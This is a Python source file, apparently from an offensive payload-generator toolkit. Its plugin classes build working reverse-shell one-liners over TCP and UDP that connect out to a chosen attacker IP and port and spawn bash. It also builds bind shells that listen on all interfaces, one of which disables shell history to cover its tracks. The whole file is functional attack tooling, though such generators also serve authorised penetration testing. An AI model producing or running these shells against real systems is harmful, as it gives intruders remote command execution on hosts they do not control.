from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--type",
            default="python",
            choices=[
                'python',
                'python2',
                'python3'
            ],
            help="Select python type: python, python2, python3 (default: python)"
        )
        self.add_args(
            "--exec",
            default="pty",
            choices=[
                'pty',
                'subprocess',
            ]
        )
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.extension = "py"
        self.set_write_file()
        self.opts.description = "[ReverseShell][TCP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"

    def make_shell(self):
        self.shell = f"""{self.args.type} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,"""
        if self.is_udp:
            self.shell += f"""socket.SOCK_DGRAM);s.connect(("{self.args.ip}",{self.args.port}));"""
        else:
            self.shell += f"""socket.SOCK_STREAM);s.connect(("{self.args.ip}",{self.args.port}));"""
        self.shell += """os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(), 2);"""
        if self.args.exec == "pty":
            self.shell += f"""import pty;pty.spawn("{self.args.shell}")'"""
        elif self.args.exec == "subprocess":
            self.shell += f"""p=subprocess.call(["{self.args.shell}","-i"]);'"""


class TTY(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--type",
            default="python",
            choices=[
                'python',
                'python2',
                'python3'
            ],
            help="Select python type: python, python2, python3 (default: python)"
        )
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "[TTYShell] Python TTY shell escape from https://netsec.ws/?p=337"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = f"""{self.args.type} -c 'import pty; pty.spawn("{self.args.shell}")'"""


class ReverseUDP(ReverseTCP):
    def __init__(self):
        super().__init__()
        self.is_udp = True
        self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."


class BindTCP(plugin.BindShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--type",
            default="python",
            choices=[
                'python',
                'python2',
                'python3'
            ],
            help="Select python type: python, python2, python3 (default: python)"
        )
        self.add_args(
            "--exec",
            default="pty",
            choices=[
                'pty',
                'subprocess',
            ]
        )
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.extension = "py"
        self.set_write_file()
        self.opts.description = "[BindShell][TCP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description = "\n[BindShell][TCP] Python from infodox/python-pty-shells. License WTFPL."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"

    def make_shell(self):
        if self.args.exec == "pty":
            self.shell = f"""{self.args.type} -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{self.args.port}));s.listen(1);(rem,addr)=s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("{self.args.shell}");s.close()'"""
        else:
            self.shell = f'''{self.args.type} -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{self.args.port}));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")\''''


class BindUDP(BindTCP):
    def __init__(self):
        super().__init__()
        self.is_udp = True
        self.opts.description = "[BindShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."

    def make_shell(self):
        pass # TODO make Bind shell python UDP with pty & subprocess